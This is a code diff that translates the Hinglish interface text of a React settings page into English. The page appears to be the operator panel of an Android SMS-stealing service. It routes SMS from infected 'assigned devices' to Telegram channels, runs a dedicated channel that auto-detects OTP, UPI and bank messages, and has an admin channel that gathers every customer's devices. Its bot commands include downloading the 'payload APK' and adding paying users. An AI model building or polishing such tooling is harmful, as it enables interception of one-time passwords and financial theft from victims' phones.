@@ -230,10 +230,10 @@ export function TelegramSettings() {
           <p className="font-semibold text-[#2d1b4e] flex items-center gap-1.5">
             <AlertCircle className="w-4 h-4 text-[#7c3aed]" /> Setup Guide
           </p>
-          <p>1. Telegram channel/group banao</p>
-          <p>2. Bot ko admin banao (message send permission)</p>
-          <p>3. Channel ID yahan paste karo (e.g. <code className="text-[#7c3aed] text-xs">-100xxxxxxxxxx</code>)</p>
-          <p>4. Bot se <code className="text-[#7c3aed] text-xs">/setchannel</code> command bhi use kar sakte ho</p>
+          <p>1. Create a Telegram channel or group</p>
+          <p>2. Add the bot as admin (with permission to post messages)</p>
+          <p>3. Paste the Channel ID here (e.g. <code className="text-[#7c3aed] text-xs">-100xxxxxxxxxx</code>)</p>
+          <p>4. Or use the <code className="text-[#7c3aed] text-xs">/setchannel</code> bot command</p>
         </div>
 
         {/* Personal SMS Channel */}
@@ -241,7 +241,7 @@ export function TelegramSettings() {
           <SectionTitle
             icon={MessageSquare}
             title="My SMS Channel"
-            sub="Apne assigned devices ke SMS is channel pe forward honge (sirf aapke devices)"
+            sub="SMS from your assigned devices will be forwarded to this channel"
           />
           {savedPersonalChannel && (
             <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
@@ -255,7 +255,7 @@ export function TelegramSettings() {
             onSave={savePersonalChannel}
             saving={savingPersonal}
             label="Channel ID"
-            helpText="Sirf is account se assigned devices ke SMS yahan ayenge"
+            helpText="Only SMS from devices assigned to your account will appear here"
           />
         </Card>
 
@@ -264,7 +264,7 @@ export function TelegramSettings() {
           <SectionTitle
             icon={IndianRupee}
             title="Finance Alert Channel"
-            sub="Sirf financial SMS (OTP, UPI, debit, credit, bank) is channel pe forward honge"
+            sub="Only financial SMS (OTP, UPI, debit, credit, bank alerts) will be forwarded here"
           />
           {savedFinanceChannel && (
             <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
@@ -278,7 +278,7 @@ export function TelegramSettings() {
             onSave={saveFinanceChannel}
             saving={savingFinance}
             label="Finance Channel ID"
-            helpText="OTP, UPI payment, bank transaction SMS automatically detect hokar yahan jayenge"
+            helpText="OTP, UPI payments, and bank transaction SMS are auto-detected and forwarded here"
           />
         </Card>
 
@@ -287,7 +287,7 @@ export function TelegramSettings() {
           <SectionTitle
             icon={Bell}
             title="Keyword Alert Rules"
-            sub="Jab kisi SMS mein specific keyword mile, us SMS ko specific channel pe forward karo"
+            sub="Forward SMS to a specific channel when a keyword is matched"
           />
 
           {rules.length > 0 && (
@@ -344,7 +344,7 @@ export function TelegramSettings() {
             <SectionTitle
               icon={Shield}
               title="Global SMS Channel (Admin)"
-              sub="ALL devices ke SMS is channel pe forward honge — admin-level setting"
+              sub="ALL devices' SMS from every user will be forwarded here — admin-level setting"
             />
             {savedGlobalChannel ? (
               <div className="mb-3 bg-[#10b981]/5 border border-[#10b981]/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
@@ -362,7 +362,7 @@ export function TelegramSettings() {
               onSave={saveGlobalChannel}
               saving={savingGlobal}
               label="Global Channel ID"
-              helpText="Sabhi users ke sabhi devices ke SMS yahan forward honge"
+              helpText="SMS from all devices of all users will be forwarded to this channel"
             />
           </Card>
         )}
@@ -372,12 +372,12 @@ export function TelegramSettings() {
           <SectionTitle icon={Settings} title="Bot Commands Reference" />
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
             {[
-              { cmd: '/setchannel -100xxx', desc: 'Global SMS channel set karo' },
-              { cmd: '/removechannel', desc: 'Global channel hata do' },
-              { cmd: '/apk', desc: 'Payload APK download karo' },
-              { cmd: '/reset_password', desc: 'Panel password reset karo' },
-              { cmd: '/stats', desc: 'Bot + device stats dekho' },
-              { cmd: '/adduser ID days email pass', desc: 'New user add karo (admin)' },
+              { cmd: '/setchannel -100xxx', desc: 'Set global SMS forward channel' },
+              { cmd: '/removechannel', desc: 'Remove global channel' },
+              { cmd: '/apk', desc: 'Download payload APK' },
+              { cmd: '/reset_password', desc: 'Reset panel password' },
+              { cmd: '/stats', desc: 'View bot & device stats' },
+              { cmd: '/adduser ID days email pass', desc: 'Add new user (admin only)' },
             ].map(({ cmd, desc }) => (
               <div key={cmd} className="bg-[#f5efff] border border-[#d8c8f0] rounded-2xl p-3">
                 <p className="text-[#6b5b7d] text-xs mb-1">{desc}</p>
